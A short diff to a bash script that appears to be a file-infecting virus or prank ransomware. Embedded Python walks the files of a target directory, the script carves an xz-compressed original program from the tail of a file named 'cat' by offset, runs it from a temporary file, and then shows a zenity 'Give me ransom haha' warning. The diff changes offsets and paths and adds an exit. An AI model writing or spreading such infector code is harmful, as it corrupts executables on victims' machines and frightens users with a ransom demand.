@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+#!/usr/bin/bash
 
 python3 <<EOF
 from os import listdir
@@ -22,9 +22,10 @@ for fil_nam in listdir(target_path):
 EOF
 
 t="$(mktemp)"
-tail -c +$((MK1 + 1)) cat | head -c MK2 | xz -d > "$t"
+tail -c +$((MK1 + 3)) ./cat | head -c MK2 | xz -d > "$t"
 chmod u+x "$t"
 "$t" "$@"
 rm "$t"
 
 zenity --warning --text="Give me ransom haha"
+exit
